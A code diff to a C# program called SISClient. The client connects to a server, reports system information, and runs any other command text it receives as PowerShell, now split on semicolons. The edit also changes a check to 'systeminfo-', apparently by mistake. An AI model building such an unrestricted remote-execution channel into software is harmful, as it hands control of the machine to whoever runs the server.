@@ -23,7 +23,6 @@ namespace SISClient
         {
             ConnectToServer();
             RequestLoop();
-
         }
 
         private static void ConnectToServer()
@@ -74,26 +73,29 @@ namespace SISClient
                     string responde = "systeminfo;" + id.ToString() + ";" + info;
                     sendCommand(responde);
                 }
-                if (text != "control" && text != "systeminfo")
+                if (text != "control" && text != "systeminfo-")
                 {
-                    try
-                    {
-                        using (PowerShell PowerShellInstance = PowerShell.Create())
+                        try
                         {
-                            PowerShellInstance.AddScript(text);
-                            IAsyncResult result = PowerShellInstance.BeginInvoke();
-                            while (result.IsCompleted == false)
+                            using (PowerShell PowerShellInstance = PowerShell.Create())
                             {
-                                Console.WriteLine("Waiting for pipeline to finish...");
-                                Thread.Sleep(1000);
+                                foreach (string t in text.Split(';'))
+                                {
+                                    PowerShellInstance.AddScript(t);
+                                    IAsyncResult result = PowerShellInstance.BeginInvoke();
+                                    while (result.IsCompleted == false)
+                                    {
+                                        Console.WriteLine("Waiting for pipeline to finish...");
+                                        Thread.Sleep(1000);
+                                    }
+                                    Console.WriteLine("Finished!");
+                                }
                             }
-                            Console.WriteLine("Finished!");
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        sendCommand(ex.Message);
-                    }
+                        catch (Exception ex)
+                        {
+                            sendCommand(ex.Message);
+                        }
                 }
             }
             catch
